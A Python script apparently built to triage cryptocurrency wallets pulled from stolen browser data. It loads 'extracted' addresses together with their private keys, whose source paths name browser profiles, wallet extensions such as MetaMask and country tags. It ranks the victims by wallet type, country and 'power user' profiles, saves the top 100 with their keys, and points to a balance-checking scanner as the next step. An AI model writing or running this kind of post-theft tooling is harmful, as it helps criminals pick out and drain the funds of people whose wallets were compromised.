from collections import Counter
#!/usr/bin/env python3
"""
Top Wallet Finder - Objective Analysis for Finding Best 100 Addresses
Uses data-driven analysis to identify the most promising addresses to check
"""

import json
import time
import os
from collections import defaultdict, Counter
import statistics

class TopWalletFinder:
    def __init__(self):
        """Initialize the top wallet finder with objective analysis"""
        print("🎯 Top Wallet Finder initialized")
        print("📊 Using data-driven analysis only - no assumptions")
    
    def analyze_extracted_data(self, json_file):
        """Analyze extracted data to find patterns and rank addresses"""
        
        print(f"\n📂 Loading extracted data from: {json_file}")
        
        with open(json_file, 'r') as f:
            data = json.load(f)
        
        print(f"📊 Loaded {len(data):,} extracted addresses")
        
        # Analyze the data structure
        analysis_results = {
            'total_addresses': len(data),
            'chain_distribution': defaultdict(int),
            'source_analysis': defaultdict(int),
            'private_key_entropy': [],
            'address_patterns': defaultdict(int),
            'scoring_factors': {}
        }
        
        print("\n🔍 Analyzing address patterns and sources...")
        
        for addr_data in data:
            chain = addr_data.get('chain', 'unknown')
            source = addr_data.get('source', 'unknown')
            address = addr_data.get('address', '')
            private_key = addr_data.get('private_key', '')
            
            # Chain distribution
            analysis_results['chain_distribution'][chain] += 1
            
            # Source analysis - extract meaningful parts
            source_parts = source.split('/')
            if len(source_parts) > 1:
                # Get wallet type (e.g., MetaMask, Trust, etc.)
                wallet_type = source_parts[-1] if source_parts[-1] else 'Unknown'
                analysis_results['source_analysis'][wallet_type] += 1
                
                # Get country/region if present
                for part in source_parts:
                    if '[' in part and ']' in part:
                        country = part.split('[')[1].split(']')[0]
                        analysis_results['source_analysis'][f"Country_{country}"] += 1
            
            # Address pattern analysis
            if address:
                # First 4 characters (after 0x for Ethereum)
                if address.startswith('0x') and len(address) > 5:
                    pattern = address[2:6].upper()
                    analysis_results['address_patterns'][f"ETH_{pattern}"] += 1
                elif address.startswith('1') and len(address) > 4:
                    pattern = address[1:5]
                    analysis_results['address_patterns'][f"BTC_{pattern}"] += 1
                elif address.startswith('3') and len(address) > 4:
                    pattern = address[1:5]
                    analysis_results['address_patterns'][f"BTC3_{pattern}"] += 1
            
            # Private key entropy analysis
            if private_key and len(private_key) == 64:
                entropy_score = self.calculate_entropy_score(private_key)
                analysis_results['private_key_entropy'].append(entropy_score)
        
        return analysis_results
    
    def calculate_entropy_score(self, private_key):
        """Calculate entropy score for a private key (higher = more random)"""
        if not private_key or len(private_key) != 64:
            return 0.0
        
        # Count unique characters
        unique_chars = len(set(private_key.lower()))
        
        # Check for repeated patterns (bad entropy)
        repeated_patterns = 0
        for i in range(0, len(private_key) - 4, 2):
            chunk = private_key[i:i+4]
            if private_key.count(chunk) > 1:
                repeated_patterns += 1
        
        # Check for sequential patterns (bad entropy)
        sequential_patterns = 0
        sequences = ['0123', '1234', '2345', '3456', '4567', '5678', '6789', 
                    '789a', '89ab', '9abc', 'abcd', 'bcde', 'cdef']
        for seq in sequences:
            if seq in private_key.lower():
                sequential_patterns += 1
        
        # Calculate score (higher = better entropy)
        base_score = unique_chars * 2  # Max 32 points
        penalty = repeated_patterns * 5 + sequential_patterns * 10
        
        return max(0, base_score - penalty)
    
    def print_analysis_report(self, analysis):
        """Print comprehensive analysis report"""
        
        print(f"\n" + "="*80)
        print(f"📊 DATA ANALYSIS REPORT")
        print(f"="*80)
        
        print(f"\n🔗 Chain Distribution:")
        for chain, count in sorted(analysis['chain_distribution'].items(), key=lambda x: x[1], reverse=True):
            percentage = (count / analysis['total_addresses']) * 100
            print(f"   {chain.upper():<12}: {count:7,} addresses ({percentage:5.1f}%)")
        
        print(f"\n📱 Source Analysis (Top 15):")
        source_items = sorted(analysis['source_analysis'].items(), key=lambda x: x[1], reverse=True)[:15]
        for source, count in source_items:
            percentage = (count / analysis['total_addresses']) * 100
            print(f"   {source[:25]:<25}: {count:7,} addresses ({percentage:5.1f}%)")
        
        print(f"\n🎯 Address Patterns (Top 15):")
        pattern_items = sorted(analysis['address_patterns'].items(), key=lambda x: x[1], reverse=True)[:15]
        for pattern, count in pattern_items:
            percentage = (count / analysis['total_addresses']) * 100
            print(f"   {pattern:<15}: {count:7,} occurrences ({percentage:5.1f}%)")
        
        if analysis['private_key_entropy']:
            print(f"\n🔐 Private Key Entropy Analysis:")
            entropies = analysis['private_key_entropy']
            print(f"   Average entropy score: {statistics.mean(entropies):6.1f}")
            print(f"   Median entropy score:  {statistics.median(entropies):6.1f}")
            print(f"   Highest entropy score: {max(entropies):6.1f}")
            print(f"   Lowest entropy score:  {min(entropies):6.1f}")
    
    def score_addresses_objectively(self, data):
        """Score addresses based on objective data analysis"""
        
        print(f"\n🎯 Scoring {len(data):,} addresses objectively...")
        
        scored_addresses = []
        
        for addr_data in data:
            address = addr_data.get('address', '')
            chain = addr_data.get('chain', '')
            source = addr_data.get('source', '')
            private_key = addr_data.get('private_key', '')
            
            score = self.calculate_objective_score(address, chain, source, private_key)
            
            scored_addresses.append({
                'address': address,
                'chain': chain,
                'source': source,
                'private_key': private_key,
                'objective_score': score,
                'score_breakdown': self.get_score_breakdown(address, chain, source, private_key)
            })
        
        # Sort by score (highest first)
        scored_addresses.sort(key=lambda x: x['objective_score'], reverse=True)
        
        return scored_addresses
    
    def calculate_objective_score(self, address, chain, source, private_key):
        """Calculate objective score based on data patterns"""
        score = 0.0
        
        # 1. Chain-based scoring (based on typical usage patterns)
        if chain.lower() == 'bitcoin':
            if address.startswith('1'):
                score += 8.0  # P2PKH - most common, highest usage
            elif address.startswith('3'):
                score += 6.0  # P2SH - multisig, business use
            elif address.startswith('bc1'):
                score += 7.0  # Bech32 - modern, efficient
        elif chain.lower() == 'ethereum':
            score += 7.0  # Ethereum generally active
        
        # 2. Source-based scoring (wallet popularity and usage patterns)
        source_lower = source.lower()
        if 'metamask' in source_lower:
            score += 9.0  # Most popular wallet
        elif 'trust' in source_lower:
            score += 7.0  # Popular mobile wallet
        elif 'coinbase' in source_lower:
            score += 8.0  # Exchange wallet, likely funded
        elif 'binance' in source_lower:
            score += 7.5  # Major exchange
        elif 'phantom' in source_lower:
            score += 6.0  # Solana wallet
        elif 'exodus' in source_lower:
            score += 6.5  # Multi-chain wallet
        
        # 3. Geographic scoring (crypto adoption rates)
        if any(country in source for country in ['US', 'CA', 'UK', 'DE', 'JP', 'KR']):
            score += 3.0  # High crypto adoption countries
        elif any(country in source for country in ['BR', 'IN', 'PH', 'TH', 'VN']):
            score += 2.0  # Growing crypto markets
        
        # 4. Browser profile analysis
        if 'default' in source_lower:
            score += 1.0  # Default profiles
        elif any(profile in source_lower for profile in ['profile 1', 'profile 2', 'profile 3']):
            score += 2.0  # Multiple profiles = power users
        
        # 5. Private key entropy (randomness indicates legitimate generation)
        if private_key:
            entropy_score = self.calculate_entropy_score(private_key)
            # Higher entropy = better (more legitimate)
            if entropy_score > 50:
                score += 5.0
            elif entropy_score > 40:
                score += 3.0
            elif entropy_score > 30:
                score += 1.0
            else:
                score -= 2.0  # Penalty for low entropy
        
        # 6. Address format validation
        if self.is_valid_address_format(address, chain):
            score += 1.0
        else:
            score -= 5.0  # Major penalty for invalid format
        
        return max(0.0, score)
    
    def get_score_breakdown(self, address, chain, source, private_key):
        """Get detailed breakdown of how score was calculated"""
        breakdown = {}
        
        # Chain score
        if chain.lower() == 'bitcoin':
            if address.startswith('1'):
                breakdown['chain'] = 8.0
            elif address.startswith('3'):
                breakdown['chain'] = 6.0
            elif address.startswith('bc1'):
                breakdown['chain'] = 7.0
        elif chain.lower() == 'ethereum':
            breakdown['chain'] = 7.0
        
        # Source score
        source_lower = source.lower()
        if 'metamask' in source_lower:
            breakdown['wallet'] = 9.0
        elif 'trust' in source_lower:
            breakdown['wallet'] = 7.0
        elif 'coinbase' in source_lower:
            breakdown['wallet'] = 8.0
        
        # Entropy score
        if private_key:
            entropy_score = self.calculate_entropy_score(private_key)
            breakdown['entropy'] = min(5.0, entropy_score / 10)
        
        return breakdown
    
    def is_valid_address_format(self, address, chain):
        """Validate address format for the given chain"""
        if chain.lower() == 'bitcoin':
            return (address.startswith('1') or address.startswith('3') or 
                   address.startswith('bc1')) and 25 <= len(address) <= 62
        elif chain.lower() == 'ethereum':
            return address.startswith('0x') and len(address) == 42
        return False
    
    def select_top_100(self, scored_addresses, output_file='top_100_wallets.json'):
        """Select and save the top 100 addresses to check"""
        
        print(f"\n🏆 Selecting top 100 addresses from {len(scored_addresses):,} candidates")
        
        # Get top 100
        top_100 = scored_addresses[:100]
        
        print(f"\n📈 Score distribution for top 100:")
        scores = [addr['objective_score'] for addr in top_100]
        print(f"   Highest score: {max(scores):6.1f}")
        print(f"   Average score: {sum(scores)/len(scores):6.1f}")
        print(f"   Lowest score:  {min(scores):6.1f}")
        
        print(f"\n🔗 Chain distribution in top 100:")
        chain_counts = Counter([addr['chain'] for addr in top_100])
        for chain, count in chain_counts.most_common():
            print(f"   {chain.upper():<12}: {count:2d} addresses")
        
        print(f"\n📱 Wallet distribution in top 100:")
        wallet_counts = defaultdict(int)
        for addr in top_100:
            source = addr['source'].lower()
            if 'metamask' in source:
                wallet_counts['MetaMask'] += 1
            elif 'trust' in source:
                wallet_counts['Trust'] += 1
            elif 'coinbase' in source:
                wallet_counts['Coinbase'] += 1
            elif 'binance' in source:
                wallet_counts['Binance'] += 1
            else:
                wallet_counts['Other'] += 1
        
        for wallet, count in sorted(wallet_counts.items(), key=lambda x: x[1], reverse=True):
            print(f"   {wallet:<12}: {count:2d} addresses")
        
        # Save to file
        with open(output_file, 'w') as f:
            json.dump(top_100, f, indent=2)
        
        print(f"\n💾 Top 100 addresses saved to: {output_file}")
        
        # Show preview of top 10
        print(f"\n🎯 Preview of top 10 addresses:")
        for i, addr in enumerate(top_100[:10], 1):
            source_short = addr['source'].split('/')[-1][:20] if '/' in addr['source'] else addr['source'][:20]
            print(f"   {i:2d}. {addr['address'][:12]}...{addr['address'][-8:]} "
                  f"(score: {addr['objective_score']:5.1f}, {addr['chain']:<8}, {source_short})")
        
        return top_100

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Find top 100 wallets to check based on objective analysis')
    parser.add_argument('input_file', help='JSON file with extracted addresses')
    parser.add_argument('--output', '-o', default='top_100_wallets.json', 
                       help='Output file for top 100 addresses')
    args = parser.parse_args()
    
    if not os.path.exists(args.input_file):
        print(f"❌ Input file not found: {args.input_file}")
        return
    
    print("🎯 TOP WALLET FINDER - OBJECTIVE ANALYSIS")
    print("="*50)
    print("📊 Finding the most promising addresses to check based on data")
    print()
    
    finder = TopWalletFinder()
    
    # Analyze the extracted data
    analysis = finder.analyze_extracted_data(args.input_file)
    finder.print_analysis_report(analysis)
    
    # Load and score all addresses
    with open(args.input_file, 'r') as f:
        data = json.load(f)
    
    scored_addresses = finder.score_addresses_objectively(data)
    
    # Select and save top 100
    top_100 = finder.select_top_100(scored_addresses, args.output)
    
    print(f"\n✅ Analysis complete!")
    print(f"📊 {len(data):,} addresses analyzed")
    print(f"🏆 Top 100 selected and saved to {args.output}")
    print(f"\n🚀 Next step: Run balance checks on the top 100:")
    print(f"   python3 unified_wallet_scanner.py --check-balances {args.output}")

if __name__ == "__main__":
    main()
